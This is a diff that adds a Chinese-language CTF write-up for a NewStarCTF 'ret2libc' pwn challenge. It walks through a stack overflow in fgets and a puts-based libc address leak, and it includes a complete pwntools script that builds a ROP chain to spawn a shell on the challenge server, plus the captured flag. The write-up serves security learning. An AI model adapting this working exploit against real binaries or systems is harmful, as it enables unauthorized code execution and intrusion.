@@ -2630,6 +2630,78 @@ io.interactive()
 
 ------
 
+### ret2libc
+
+先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2libc]
+└─$ file ./pwn
+./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a55aea407e818c5b33f682baba13f279efc2502, not stripped
+                                                                                                                                                 
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2libc]
+└─$ checksec --file=./pwn
+[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/ret2libc/pwn'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[32]; // [rsp+0h] [rbp-20h] BYREF
+  init(argc, argv, envp);
+  puts("Glad to meet you again!What u bring to me this time?");
+  fgets(s, 96, stdin);
+  puts("Ok.See you!");
+  return 0;
+}
+```
+
+虽然`fgets()`函数限制了输入的字节数，但是并没有什么用，还是存在栈溢出漏洞。构造`payload`时`padding`一共需要`0x20+0x8`个字节才能覆盖到栈帧。
+
+`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400753`，`ret`的地址是`0x40050e`。
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并利用`puts()`函数泄露`puts()`函数在`got`表中的真实地址。
+
+编写`Python`代码，使用题目附件给的`libc-2.31.so`求解`libc`基地址，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`成功，`cat flag`得到`flag{a97738b3-773f-4299-bf67-5cfba5817cbf}`，提交即可。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 27359)
+elf = ELF('./pwn')
+padding = b'a'*(0x20+0x8)
+main_addr = elf.symbols['main']
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+pop_rdi = 0x400753 # pop rdi; ret
+payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+io.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload)
+io.recvuntil('Ok.See you!\n')
+tmp = io.recvline()[:-1]
+puts_addr = u64(tmp.ljust(8, b'\x00'))
+log.info('puts_addr => %s = %s' % (repr(tmp), hex(puts_addr)))
+ret = 0x40050e # ret
+libc = ELF('./libc-2.31.so')
+libcbase = puts_addr - libc.symbols['puts']
+system_addr = libcbase + libc.symbols['system']
+log.info('system_address => %s', hex(system_addr))
+bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
+log.info('bin_sh_address => %s', hex(bin_sh_addr))
+payload = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
+io.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload)
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
